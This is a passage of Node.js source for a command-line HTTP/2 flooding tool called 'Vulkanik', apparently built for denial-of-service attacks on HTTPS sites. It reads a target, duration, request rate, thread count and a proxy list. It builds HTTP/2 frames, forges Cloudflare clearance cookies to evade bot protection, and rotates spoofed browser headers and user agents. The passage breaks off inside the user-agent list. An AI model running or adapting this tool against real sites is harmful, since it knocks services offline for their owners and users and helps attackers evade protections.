#!/usr/bin/env node
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        console.log(e)
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

const statusesQ = []
let statuses = {}

const blockedDomain = [".gov", ".edu", "go.id"];

const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const currentDate = new Date();
const targetDate = new Date('2088-05-25');
let isFull = process.argv.includes('--full');

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const ratelimit = process.argv[5];
const threads = process.argv[6];
const proxyfile = process.argv[7];
const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
const inputIndex = process.argv.indexOf('--input');
const input = inputIndex !== -1 && inputIndex + 1 < process.argv.length ? process.argv[inputIndex + 1] : undefined;
const forceHttpIndex = process.argv.indexOf('--http');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;

if (!reqmethod || !target || !time || !ratelimit || !threads || !proxyfile) {
    console.error(`
    How to use & example:
      ./Vulkanik <GET/POST/HEAD/OPTIONS/CONNECT> <target> <time> <ratelimit> <threads> <proxy>
--Options?
 - dm or contact @LEXYZV
    `);

    process.exit(1);
}

let hcookie = '';

const url = new URL(target)
const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')

if (currentDate > targetDate) {
    console.error('expride Methods, plis dm @LEXYZV');
    process.exit(1);
}

if (url.hostname.endsWith(blockedDomain)) {
    console.log(`Domain ${blockedDomain} blocked, @LEXYZV`);
    process.exit(1);
}

if (!['GET', 'POST', 'HEAD', 'OPTIONS', 'CONNECT'].includes(reqmethod)) {
    console.error('Error request method only can GET/POST/HEAD/OPTIONS/CONNECT');
    process.exit(1);
}

if (!target.startsWith('https://')) {
    console.error('Error protocol can only https://');
    process.exit(1);
}

if (isNaN(time) || time <= 0 || time > 86400) {
    console.error('Error time can not high 86400')
    process.exit(1);
}

if (isNaN(threads) || threads <= 0 || threads > 80) {
    console.error('Error threads can not high 80')
    process.exit(1);
}

if (isNaN(ratelimit) || ratelimit <= 0 || ratelimit > 512) {
    console.error(`Error ratelimit can not high 512`)
    process.exit(1);
}

if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
    hcookie = `cf_chl_rt_tk=${randstr(23)}_${randstr(19)}-${timestampString}-1-${randstr(4)}/${randstr(65)}+${randstr(16)}=; cf_clearance= + randstr(32) + "." + randstr(10) + "-" + randstr(10) + "-1.0.1.1-" + randstr(11) + "_vs_V." + randstr(21) + "_" + randstr(47)`;
}

if (cookieValue) {
    hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}

const getRandomChar = () => {
    const pizda4 = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * pizda4.length);
    return pizda4[randomIndex];
};

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function ememmmmmemmeme(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function getRandomToken(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let token = '';
    for (let i = 0; i < length; i++) {
        token += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return token;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function buildRequest() {
    const browserVersion = getRandomInt(120, 123);

    const fwfw = ['Google Chrome', 'Brave'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];

   let brandValue;
    if (browserVersion === 120) {
        brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    } 
    else if (browserVersion === 121) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
    }
    else if (browserVersion === 122) {
        brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${wfwf}";v="${browserVersion}"`;
    }
    else if (browserVersion === 123) {
        brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
    }

    const isBrave = wfwf === 'Brave';

    const site = [
        'cross-site',
        'same-origin',
        'same-site',
        'none'
      ];
      
     const mode = [
        'cors',
        'navigate',
        'no-cors',
        'same-origin'
      ];
      
     const dest = [
        'document',
        'image',
        'embed',
        'empty',
        'frame',
      'script'
      ];
      const type = [
        "text/plain",
        "text/html",
        "application/json",
        "application/xml",
        "multipart/form-data",
        "application/octet-stream",
        "image/jpeg",
        "image/png",
        "audio/mpeg",
        "video/mp4",
        "application/javascript",
        "application/pdf",
        "application/vnd.ms-excel",
        "application/vnd.ms-powerpoint",
        "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        "application/zip",
        "image/gif",
        "image/bmp",
        "image/tiff",
        "audio/wav",
        "audio/midi",
        "video/avi",
        "video/mpeg",
        "video/quicktime",
        "text/csv",
        "text/xml",
        "text/css",
        "text/javascript",
        "application/graphql",
        "application/x-www-form-urlencoded",
        "application/vnd.api+json",
        "application/ld+json",
        "application/x-pkcs12",
        "application/x-pkcs7-certificates",
        "application/x-pkcs7-certreqresp",
        "application/x-pem-file",
        "application/x-x509-ca-cert",
        "application/x-x509-user-cert",
        "application/x-x509-server-cert",
        "application/x-bzip",
        "application/x-gzip",
        "application/x-7z-compressed",
        "application/x-rar-compressed",
        "application/x-shockwave-flash"
       ];
       const lang_header = ["he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
 "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
 "en-US,en;q=0.5", "en-US,en;q=0.9",
 "de-CH;q=0.7",
 "da, en-gb;q=0.8, en;q=0.7",
 "cs;q=0.5",
 'en-US,en;q=0.9',
 'en-GB,en;q=0.9',
 'en-CA,en;q=0.9',
 'en-AU,en;q=0.9',
 'en-NZ,en;q=0.9',
 'en-ZA,en;q=0.9',
 'en-IE,en;q=0.9',
 'en-IN,en;q=0.9',
 'ar-SA,ar;q=0.9',
 'az-Latn-AZ,az;q=0.9',
 'be-BY,be;q=0.9',
 'bg-BG,bg;q=0.9',
 'bn-IN,bn;q=0.9',
 'ca-ES,ca;q=0.9',
 'cs-CZ,cs;q=0.9',
 'cy-GB,cy;q=0.9',
 'da-DK,da;q=0.9',
 'de-DE,de;q=0.9',
 'el-GR,el;q=0.9',
 'es-ES,es;q=0.9',
 'et-EE,et;q=0.9',
 'eu-ES,eu;q=0.9',
 'fa-IR,fa;q=0.9',
 'fi-FI,fi;q=0.9',
 'fr-FR,fr;q=0.9',
 'ga-IE,ga;q=0.9',
 'gl-ES,gl;q=0.9',
 'gu-IN,gu;q=0.9',
 'he-IL,he;q=0.9',
 'hi-IN,hi;q=0.9',
 'hr-HR,hr;q=0.9',
 'hu-HU,hu;q=0.9',
 'hy-AM,hy;q=0.9',
 'id-ID,id;q=0.9',
 'is-IS,is;q=0.9',
 'it-IT,it;q=0.9',
 'ja-JP,ja;q=0.9',
 'ka-GE,ka;q=0.9',
 'kk-KZ,kk;q=0.9',
 'km-KH,km;q=0.9',
 'kn-IN,kn;q=0.9',
 'ko-KR,ko;q=0.9',
 'ky-KG,ky;q=0.9',
 'lo-LA,lo;q=0.9',
 'lt-LT,lt;q=0.9',
 'lv-LV,lv;q=0.9',
 'mk-MK,mk;q=0.9',
 'ml-IN,ml;q=0.9',
 'mn-MN,mn;q=0.9',
 'mr-IN,mr;q=0.9',
 'ms-MY,ms;q=0.9',
 'mt-MT,mt;q=0.9',
 'my-MM,my;q=0.9',
 'nb-NO,nb;q=0.9',
 'ne-NP,ne;q=0.9',
 'nl-NL,nl;q=0.9',
 'nn-NO,nn;q=0.9',
 'or-IN,or;q=0.9',
 'pa-IN,pa;q=0.9',
 'pl-PL,pl;q=0.9',
 'pt-BR,pt;q=0.9',
 'pt-PT,pt;q=0.9',
 'ro-RO,ro;q=0.9',
 'ru-RU,ru;q=0.9',
 'si-LK,si;q=0.9',
 'sk-SK,sk;q=0.9',
 'sl-SI,sl;q=0.9',
 'sq-AL,sq;q=0.9',
 'sr-Cyrl-RS,sr;q=0.9',
 'sr-Latn-RS,sr;q=0.9',
 'sv-SE,sv;q=0.9',
 'sw-KE,sw;q=0.9',
 'ta-IN,ta;q=0.9',
 'te-IN,te;q=0.9',
 'th-TH,th;q=0.9',
 'tr-TR,tr;q=0.9',
 'uk-UA,uk;q=0.9',
 'ur-PK,ur;q=0.9'
];
 
 const encoding_header = [
    'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
  'compress;q=0.5, gzip;q=1.0',
  'identity',
  'gzip, compress',
  'compress, deflate',
  'compress',
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate'
 ];
      var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
      var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
      var mode1 = mode[Math.floor(Math.floor(Math.random() * mode.length))];
      var dest1 = dest[Math.floor(Math.floor(Math.random() * dest.length))];
      var site1 = site[Math.floor(Math.floor(Math.random() * site.length))]; 
      var type1 = type[Math.floor(Math.floor(Math.random() * type.length))];    

    const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8';

    const uap = [
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36",
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.3 Iceweasel/2.0.0.13 (Debian-2.0.0.13-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.8.1.12) Gecko/20080129 Iceweasel/2.0.0.12 (Debian-2.0.0.12-1)",
"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.8.1.12) Gecko/20080129 Iceweasel/2.0.0.12 (Debian-2.0.0.12-1)",
"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.8.1.12) Gecko/20080129 Iceweasel/2.0.0.12 (Debian-2.0.0.12-0etch1)",
"Mozilla/5.0 (X11; U; Linux x86_64; es-ES; rv:1.8.1.11) Gecko/20071128 Iceweasel/2.0.0.11 (Debian-2.0.0.11-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.11) Gecko/20071128 Iceweasel/2.0.0.11 (Debian-2.0.0.11-1)",
"Mozilla/5.0 (X11; U; Linux i686; ja; rv:1.8.1.11) Gecko/20071128 Iceweasel/2.0.0.11 (Debian-2.0.0.11-1)",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.2.13) Gecko/20101203 IceWeasel/2.0.0.11 Mnenhy/0.8.3",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-4)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.8.1.1) Gecko/2006120502 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux i686; de; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1) Gecko/20061024 Iceweasel/2.0 (Debian-2.0+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.9.0.9) Gecko/2009050519 iceweasel/2.0 (Debian-3.0.6-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Iceweasel/2.0 (Debian-2.0+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en; rv:1.8.1) Gecko/20061024 Iceweasel/2.0 (Debian-2.0+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en; rv:1.8.1) Gecko/20061024 Iceweasel/2.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20061022 Iceweasel/1.5.0.7-g2",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.8pre) Gecko/20061001 Firefox/1.5.0.8pre (Iceweasel)",
"Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.9.0.7) Gecko/2009030814 Iceweasel Firefox/3.0.7 (Debian-3.0.7-1)",
"Mozilla/5.0 (Linux; Android 12; motorola edge 20 pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Mobile Safari/537.36 EdgA/102.0.1245.44",
"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1811) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Mobile Safari/537.36 EdgA/102.0.1245.44",
"Mozilla/5.0 (Linux; Android 11; CPH1979) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Mobile Safari/537.36 EdgA/102.0.1245.44",
"Mozilla/5.0 (Linux; Android 12; SM-N981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Mobile Safari/537.36 EdgA/102.0.1245.44",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.0 Safari/537.36 Edg/105.0.1296.0",
"Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Mobile Safari/537.36 EdgA/102.0.1245.44",
"Mozilla/5.0 (Linux; Android 12; SM-A725F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Mobile Safari/537.36 EdgA/102.0.1245.44",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4881.178 Safari/537.36 Edg/98.0.1108.50",
"Mozilla/5.0 (Linux; Android 10; SM-G960U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 EdgA/102.0.1245.39",
"Mozilla/5.0 (Linux; Android 9; SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Mobile Safari/537.36 EdgA/102.0.1245.44",
"Mozilla/5.0 (Linux; Android 10; JNY-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 EdgA/102.0.1245.39",
"Mozilla/5.0 (Linux; Android 10; LM-K200) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 EdgA/102.0.1245.39",
"Mozilla/5.0 (Linux; Android 12; SM-G991N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 EdgA/102.0.1245.39",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4041.0 Safari/537.36 Edg/81.0.409.0",
"Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Mobile Safari/537.36 EdgA/99.0.1150.52",
"Mozilla/5.0 (Linux; Android 7.0; SM-J701M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Mobile Safari/537.36 EdgA/102.0.1245.44",
"Mozilla/5.0 (Linux; Android 11; TECNO CG7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Mobile Safari/537.36 EdgA/101.0.1210.53",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5111.0 Safari/537.36 Edg/104.0.1290.0",
"Mozilla/5.0 (Linux; Android 11; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Mobile Safari/537.36 EdgA/102.0.1245.44",
"Mozilla/5.0 (Linux; Android 11; SM-A505GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Mobile Safari/537.36 EdgA/102.0.1245.44",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Safari/537.36 Edg/102.0.1245.44",
"Mozilla/5.0 (Linux; Android 9; Redmi Note 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Mobile Safari/537.36 EdgA/102.0.1245.44",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB) Gecko/20161904 Firefox/104.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20010101 Firefox/103.0",
"Mozilla/5.0 (X11; U; Linux x86_64) Gecko/20071114 Firefox/104.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB) Gecko/20172901 Firefox/104.0",
"Mozilla/5.0 (Windows NT 5.1; rv:98.0) Gecko/20100101 Firefox/98.0",
"Mozilla/5.0 (Android 7.1.2; Mobile; rv:102.0) Gecko/102.0 Firefox/102.0",
'Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 8T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36',
'Dalvik/2.1.0 (Linux; U; Android 10; MI 9 MIUI/V12.0.4.0.QFAMIXM)',
'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; M2101K6G Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/369.0.0.18.103;]',
'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 10; pl-pl; Mi MIX 2S Build/QKQ1.190828.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.10.0-gn',
'Mozilla/5.0 (Linux; Android 8.0.0; moto g(6)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SM-A705FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/369.0.0.18.103;]',
'Mozilla/5.0 (Linux; Android 10; M2010J19SY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; RMX3363 Build/RKQ1.210408.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.78 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/369.0.0.18.103;]',
'Mozilla/5.0 (Linux; Android 9; SM-G973U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A705FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A226B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/92.0.4515.166 Mobile Safari/537.36',
